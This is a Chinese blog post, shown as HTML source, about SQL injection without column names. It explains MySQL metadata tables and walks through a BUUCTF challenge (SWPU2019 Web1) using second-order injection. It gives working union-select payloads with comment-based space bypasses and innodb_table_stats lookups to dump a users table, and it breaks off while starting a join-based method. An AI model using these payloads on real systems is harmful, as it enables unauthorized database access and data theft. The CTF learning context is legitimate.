@@ -1,0 +1,641 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Web" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/384200ef.html">
+
+
+
+  <title>
+SQL无列名注入 - Web狗的自我安慰 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">SQL无列名注入
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-03-03 19:10:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-03-03T19:10:34+08:00">2024-03-03</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture5.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web狗的自我安慰"><span itemprop="name">Web狗的自我安慰</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/384200ef.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="sql无列名注入"><a class="markdownIt-Anchor" href="#sql无列名注入">#</a> SQL 无列名注入</h1>
+<p>​	前段时间，队里某位大佬发了一个关于 sql 注入无列名的文章，感觉好像很有用，特地研究下。</p>
+<h2 id="关于-information_schema-数据库"><a class="markdownIt-Anchor" href="#关于-information_schema-数据库">#</a> 关于 information_schema 数据库：</h2>
+<p>​	对于这一个库，我所知晓的内容并不多，并且之前总结 SQL 注入的时候忘记说这个数据库了，在这里补充一下，简单点儿来说，就是这个数据库中的某些表存放着数据库的一些信息，例如，我电脑中所有的数据库中存在如下的几个数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sakila             |</span><br><span class="line">| sys                |</span><br><span class="line">| test               |</span><br><span class="line">| world              |</span><br><span class="line">+--------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	那么我们通过查 information_schema 中的  SCHEMATA 表中的 SCHEMA_NAME 字段可以得到所有数据库的库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select SCHEMA_NAME from SCHEMATA;</span><br><span class="line">+--------------------+</span><br><span class="line">| SCHEMA_NAME        |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql              |</span><br><span class="line">| information_schema |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| sakila             |</span><br><span class="line">| world              |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	同时，tables 这个表中存在很多关于表的内容的字段，例如：</p>
+<p>​			table_schema，这个字段用于存放某张表属于哪一个数据库的字段。</p>
+<p>​			table_name， 这个字段用于存放所有的表的名字</p>
+<p>​	如果想要查到某个数据库中的所有表名，则需要查询 table_name 这个字段，然后用 where 来限制 table_schema 查找对应的数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from TABLES where table_schema=&#x27;test&#x27;;</span><br><span class="line">+------------+</span><br><span class="line">| TABLE_NAME |</span><br><span class="line">+------------+</span><br><span class="line">| questions  |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	另外，information_schema 库中还有一张 columns 表，这里面存的是所有字段的信息，columns 表中存在 table_name , table_schema , column_name 对于 table_schema，这里面则是所有字段所在表的名字，而 table_schema 则是存放了所有字段的表所在的数据库的名字，另外，column_name 则是存放了所有的字段的名字，因此，想要查询到某个数据库中所有字段的名字，或者某张表的所有的字段的名字则可以用如下的命令查找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from columns where table_schema=&#x27;test&#x27;; #查询某个库里面所有的字段的名字</span><br><span class="line">+-------------+</span><br><span class="line">| COLUMN_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| answer      |</span><br><span class="line">| id          |</span><br><span class="line">| quest       |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select column_name from columns where table_name=&#x27;questions&#x27;; #查询某张表中所有字段的内容（由于这个库中只有一张表，所以结果一样）</span><br><span class="line">+-------------+</span><br><span class="line">| COLUMN_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| answer      |</span><br><span class="line">| id          |</span><br><span class="line">| quest       |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h2 id="关于innodb引擎"><a class="markdownIt-Anchor" href="#关于innodb引擎">#</a> 关于 InnoDb 引擎：</h2>
+<p>​	<strong>我不知道这个具体是个什么东西，有什么用，但是还是记录一下，有条件再拿来研究看看。</strong></p>
+<p>从 MYSQL5.5.8 开始，InnoDB 成为其默认存储引擎。而在 MYSQL5.6 以上的版本中，mysql 数据库中 inndb 增加了 innodb_index_stats 和 innodb_table_stats 两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。其利用方式是：mysql.innodb_index_stats 和 mysql.innodb_table_stats</p>
+<p>​	依旧拿上面的那张表作为延时，也就是 test 库里面的 questions 这张表。</p>
+<p>​	再<strong> mysql</strong> 这个数据库种存在两张表，里面分别存放了一些内容，例如，<strong>innodb_table_stats</strong> 这个表，存放的是所有的表名，也就是<strong> database_name</strong> 还有<strong> table_name</strong> 这两张表，但是没有存放列名，因此，这里可以试着访问下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from innodb_table_stats where database_name=&#x27;ctfer&#x27;;</span><br><span class="line">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| database_name | table_name | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class="line">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| ctfer         | users      | 2024-03-02 16:37:10 |      0 |                    1 |                        0 |</span><br><span class="line">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	再然后就是<strong> mysql</strong> 数据库中的<strong> innodb_index_stats</strong> 表，里面我总结不出来具体是什么信息，但是里面存放有所有数据库中的所有表的信息，也就是<strong> database_name</strong> 还有<strong> table_name</strong> 这两张表，不过，还是没有存放字段的信息，这里可以试着访问下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from innodb_index_stats where database_name=&#x27;ctfer&#x27;;</span><br><span class="line">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| database_name | table_name | index_name      | last_update         | stat_name    | stat_value | sample_size | stat_description                  |</span><br><span class="line">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | n_diff_pfx01 |          0 |           1 | DB_ROW_ID                         |</span><br><span class="line">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h2 id="关于sys数据库"><a class="markdownIt-Anchor" href="#关于sys数据库">#</a> 关于 sys 数据库：</h2>
+<p>在 5.7 以上的 MYSQL 中，新增了 sys 数据库，该库的基础数据来自 information_schema 和 performance_chema，其本身不存储数据。可以通过其中的 schema_auto_increment_columns 来获取表名。其用法是 sys.schema_auto_increment_columns</p>
+<p>​	在<strong> sys</strong> 数据库种，存在一个<strong> schema_auto_increment_columns</strong> 表，里面存在几个字段，用于存放数据库名和表名以及字段名，有<strong> table_schema</strong> 以及<strong> table_name</strong> 还有<strong> column_name</strong>，但是，不知道为啥，<strong>我这里查询到的内容并不完全，少了很多内容，不过还是先仍在这儿吧</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from schema_auto_increment_columns;</span><br><span class="line">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class="line">| table_schema | table_name | column_name  | data_type | column_type        | is_signed | is_unsigned | max_value  | auto_increment | auto_increment_ratio |</span><br><span class="line">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class="line">| sakila       | payment    | payment_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |          16049 |               0.2449 |</span><br><span class="line">| sakila       | category   | category_id  | tinyint   | tinyint unsigned   |         0 |           1 |        255 |             16 |               0.0627 |</span><br><span class="line">| sakila       | language   | language_id  | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              6 |               0.0235 |</span><br><span class="line">| sakila       | film       | film_id      | smallint  | smallint unsigned  |         0 |           1 |      65535 |           1000 |               0.0153 |</span><br><span class="line">| sakila       | address    | address_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |            605 |               0.0092 |</span><br><span class="line">| sakila       | city       | city_id      | smallint  | smallint unsigned  |         0 |           1 |      65535 |            600 |               0.0092 |</span><br><span class="line">| sakila       | customer   | customer_id  | smallint  | smallint unsigned  |         0 |           1 |      65535 |            599 |               0.0091 |</span><br><span class="line">| sakila       | staff      | staff_id     | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              2 |               0.0078 |</span><br><span class="line">| sakila       | store      | store_id     | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              2 |               0.0078 |</span><br><span class="line">| sakila       | actor      | actor_id     | smallint  | smallint unsigned  |         0 |           1 |      65535 |            200 |               0.0031 |</span><br><span class="line">| sakila       | country    | country_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |            109 |               0.0017 |</span><br><span class="line">| sakila       | inventory  | inventory_id | mediumint | mediumint unsigned |         0 |           1 |   16777215 |           4581 |               0.0003 |</span><br><span class="line">| sakila       | rental     | rental_id    | int       | int                |         1 |           0 | 2147483647 |          16049 |               0.0000 |</span><br><span class="line">| world        | city       | ID           | int       | int                |         1 |           0 | 2147483647 |           4079 |               0.0000 |</span><br><span class="line">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class="line">14 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+<h2 id="无列名注入union"><a class="markdownIt-Anchor" href="#无列名注入union">#</a> 无列名注入–union：</h2>
+<h3 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理：</h3>
+<p>​	例如，对于如下的一个表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users；</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	如果我们想要进行查询，那么则需要表明，甚至是库名，不过，可以通过 table_schema=database () 来指定库名，因此，想要查询内容，则表名似乎成为了必须的内容，但是，在进行 sql 注入的时候，有的时候会对 information 进行过滤，因此，则无法做题，那么，这里则需要利用 union 的方式进行无列名的注入。</p>
+<p>​	如果我们想要查询到这个 flag 的话，那么我们或许可以考虑将字段修改为我们能够查询到的字段，比如，1、2、3，所以，使用如下命令做个尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2,3  union select * from users;</span><br><span class="line">+--------+-----------+-----------------------------------+</span><br><span class="line">| 1      | 2         | 3                                 |</span><br><span class="line">+--------+-----------+-----------------------------------+</span><br><span class="line">| 1      | 2         | 3                                 |</span><br><span class="line">| xiaomi | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+--------+-----------+-----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	可以知道的是，这里通过两次查询，第一次查询了 1，2，3 三个字段，第二次查询了 users 表中的所有字段，然后将 users 表中的所有字段联合在第一次查询到的字段中输出出来，根据这种情况，下面则有两种方式查询到 flag 的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `3` from (select 1,2,3 union select * from users)a; #联合了1，2，3之后，如果用数字查询的话需要用反引号来表示引用，而不是一个值</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 3                                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 3                                 |</span><br><span class="line">| flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select b from (select 1,2,3 as b union select * from users)a; #这里通过3 as b 的方式给字段3重命名为b，然后再进行插叙</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| b                                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 3                                 |</span><br><span class="line">| flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>注：这里不知道为何需要在括号外面随意写一些字符，如果有知道的话请帮忙讲解一下。</strong></p>
+<h3 id="题目案例buuctf-swpu2019web1"><a class="markdownIt-Anchor" href="#题目案例buuctf-swpu2019web1">#</a> 题目案例–BUUCTF----[SWPU2019] Web1：</h3>
+<p>​	刚拿到这道题的时候，我是一点儿思路都没有，全称黑人问号，即使这道这道题的考点是 sql 注入也是一样的，完全找不到下手的点。</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/3e1023f3f67e4d3fac843a2f1486c2a9.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	最开始，一个登陆框一度让我认为是 sql 注入的万能密码，结果不是，弱密码？猜了几个也没才出来，因此，可以排除是弱密码以及万能密码了，跟着 dalao 们的 wp 做，发现这里可以直接注册一个非 admin 的账号，好吧，我人傻了，那就随便注册一下，账号 qwe，密码 123456，登录。</p>
+<p>​	登录之后是这样的一个内容：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/093d175444854bd3988bb876439407a9.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	这里，似乎能点的超链接只有一个申请发布广告，下面那一个点了之后似乎就退出登录了，显然是错的，所以点一下申请发布广告：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/b146d1cf26474ba899ca67be5f4fca2f.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	出现了这样的一个页面，那么，这个又代表了什么呢？如果不是明确地指出这道题是 sql 注入的话，我可能还是会无脑认为这个题目是一道 XSS 的漏洞，那么，这个到底是个啥？</p>
+<p>​	看了下 dalao 们的 wp，说的是这是一道二次注入，是一道我没有遇到过的漏洞。</p>
+<h4 id="什么是二次注入"><a class="markdownIt-Anchor" href="#什么是二次注入">#</a> 什么是二次注入：</h4>
+<p>​	二次注入就是指以储存（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致注入。</p>
+<h4 id="二次注入的原理"><a class="markdownIt-Anchor" href="#二次注入的原理">#</a> 二次注入的原理：</h4>
+<p>​	首先，对于某些字符，在进行数据库插入数据时，对其中的某些特殊字符进行了转义处理，比如 1’变成了 1\’ 在写入数据库的时候保留了原来的数据，也就是 1’。然后，开发者又默认了存入数据库中的数据都是安全的，因此，在进行查询时，直接从数据库中取出而已树据，并没有进行进一步的检验的处理，在下一次的使用中拼凑在一起，就形成了二次注入。</p>
+<h4 id="继续做题"><a class="markdownIt-Anchor" href="#继续做题">#</a> 继续做题：</h4>
+<p>​	既然这道题是个二次注入的题目，那么就应该考虑，使用 sql 注入的方式了。首先构造语句，判断注入类型以及想办法清楚到底过滤了那些关键字，首先构造 sql 语句，之后申请，然后广告详情：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure>
+<p>​	得到了</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ limit 0,1’ at line 1</p>
+</blockquote>
+<p>​	的一个回显，通过报错信息，或许是一个字符型注入，紧接着，判断过滤，经过多次尝试，发现过滤了的有：</p>
+<blockquote>
+<p>or , # , 空格，order by ，information_schema</p>
+</blockquote>
+<p>​	对于空格而言，则可以使用 /**/ 来绕过，order by 则可以使用 group by ，# 则可以使用，'3 来闭合后面的引号来绕过，另外，information_schema 则可以使用最开始说到的无列名注入的相关的知识了，通过<strong> InnoDb</strong> 引擎查表名，第一个 payload 为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/group/**/by/**/22,&#x27;3</span><br></pre></td></tr></table></figure>
+<p>​	首先，构造的 group by 后面的整数位 22 的时候，没有出现错误，但是，当整数为 23 的时候，却出现了报错：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/3ef317d47b864de49209ed80d92d26fb.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	大致可以推测出，字段总的有 22 个。</p>
+<p>​	那么，知道了总的有多少个字段之后，就可以试着获得数据库名和表名了，构造的 payload 分别为：</p>
+<p>​	首先通过构造如下 payload 获取回显点，最后发现，回显点是 2，3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>
+<p>​	获得数据库名，成功拿到数据库为 web1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27; </span><br></pre></td></tr></table></figure>
+<p>​	获得表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure>
+<p>​	最后确定，web1 这个数据库中存在的表为如下：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/854b8d1498074d73a2f7023c6ab6f41f.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	根据 dalao 们的 wp，他们使用的都是 users 这个表，因此，这里就不用一个表一个表地查了，直接 users 这个表梭哈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,		(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure>
+<p>​	该 payload 是利用了上面说到的无列名地 union 方法进行的，当然，为啥确定 users 表中存在 3 个字段呢？因为经过试错，发现一个字段，两个字段以及四个以上的时候，均是报错，所以，可以利用这一点，进行查询，然后通过</p>
+<p>​	然后通过修改 as b 所在的地方，比如 1 的后方或者 2 的后方对列进行查找，最后发现在第三列查到了 flag：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/169fb5b613c84ef7bea030410db6f7dc.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	完成啦  <strong>(p≧w≦q)</strong>  。</p>
+<h2 id="无列名注入join"><a class="markdownIt-Anchor" href="#无列名注入join">#</a> 无列名注入–join：</h2>
+<p>​	当然，由于 union 在的地位太过重要，因此有的时候可能会直接对 union 进行过滤，这个时候呢，就需要用到 join 来进行注入。</p>
+<blockquote>
+<p><strong>在那之前，先讲一下相关的前置知识，虽然我也不懂这些，不过还是先记录一下：</strong></p>
+<ul>
+<li>join 连接两张表</li>
+<li>using () 用于两张表之间的 join 连接查询，并且 using () 中的列在两张表中都存在，作为 join 的条件</li>
+</ul>
+</blockquote>
+<p>​	首先，还是之前的那一个 ctfer 的数据库，下面通过这个数据库做几个实验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users as a join users as b;</span><br><span class="line">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              | username | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; | xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>​	<strong>可以发现，查询的两次同一个表，被拼接成了一个</strong>，那么，这个有什么用呢？试试在这之前加上一个查询，看看查询这拼接到一起的这个表：</p>
